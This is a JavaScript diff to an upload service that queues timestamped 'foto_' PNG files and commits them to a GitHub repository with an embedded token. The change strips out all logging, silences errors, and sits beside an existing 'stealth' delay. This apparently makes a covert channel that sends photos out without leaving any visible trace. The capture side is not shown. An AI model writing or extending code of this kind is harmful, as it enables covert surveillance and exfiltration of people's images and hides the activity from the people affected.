@@ -11,11 +11,30 @@ export const GH_CONFIG = {
 const uploadQueue = [];
 let isProcessing = false;
 
+// Variables para control de nombres y contadores
+let lastMinuteKey = "";
+let minuteCounter = 0;
+
 /**
  * Agrega una tarea de subida a la cola y arranca el procesador si no está activo.
  */
-export async function queueUpload(fileName, fileContent, folderPath, commitMessage) {
-    console.log(`[GitHub Service] Encolando subida: ${fileName} para tipo: ${folderPath}`);
+export async function queueUpload(typeLabel, fileContent, folderPath, commitMessage) {
+    const now = new Date();
+    const day = String(now.getDate()).padStart(2, '0');
+    const month = ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"][now.getMonth()];
+    const year = now.getFullYear();
+    const hours = String(now.getHours()).padStart(2, '0');
+    const minutes = String(now.getMinutes()).padStart(2, '0');
+
+    const currentMinuteKey = `${day}_${month}_${year}__${hours}_${minutes}`;
+    if (currentMinuteKey === lastMinuteKey) {
+        minuteCounter++;
+    } else {
+        lastMinuteKey = currentMinuteKey;
+        minuteCounter = 1;
+    }
+
+    const fileName = `foto_${typeLabel}__${currentMinuteKey}__${minuteCounter}.png`;
     uploadQueue.push({ fileName, fileContent, folderPath, commitMessage });
     if (!isProcessing) {
         processQueue();
@@ -33,7 +52,6 @@ async function processQueue() {
 
     isProcessing = true;
     const task = uploadQueue[0];
-    console.log(`[GitHub Service] Procesando subida: ${task.fileName}...`);
 
     try {
         // Pequeño retardo para no saturar el procesador inmediatamente (stealth)
@@ -50,20 +68,11 @@ async function processQueue() {
 
         // VALIDACIÓN PARA ENTORNO LOCAL
         if (token.startsWith("__") || token === "") {
-            console.error(`[GitHub Service] ERROR CRÍTICO: Los secretos no se han inyectado en el archivo JS.`);
-            console.log(`Estado de variables:
-                - Token presente: ${!token.startsWith("__")}
-                - Usuario presente: ${!owner.startsWith("__")}
-                - Repo destino: ${repo}`);
-            console.warn(`Por favor, asegúrate de que GitHub Pages esté configurado para usar la rama 'gh-pages'.`);
             uploadQueue.shift();
             processQueue();
             return;
         }
         
-        // Debug log (seguro) para verificar el formato del token decodificado
-        console.log(`[GitHub Service] Verificando credenciales... (Prefijo: ${token.substring(0, 4)})`);
-
         // CONVERSIÓN SEGURA A BASE64 (Evita el error de Stack Size)
         const bytes = new Uint8Array(task.fileContent);
         let binary = "";
@@ -98,15 +107,8 @@ async function processQueue() {
             })
         });
 
-        if (response.ok) {
-            console.log(`[GitHub Service] Éxito al subir: ${task.fileName}`);
-        } else {
-            const errorMsg = await response.text();
-            console.error(`[GitHub Service] Error en servidor para ${task.fileName}:`, errorMsg);
-        }
-
     } catch (error) {
-        console.error(`[GitHub Service] Error crítico al subir ${task.fileName}:`, error);
+        // Error silencioso
     }
 
     // Liberamos memoria eliminando la tarea procesada y continuamos
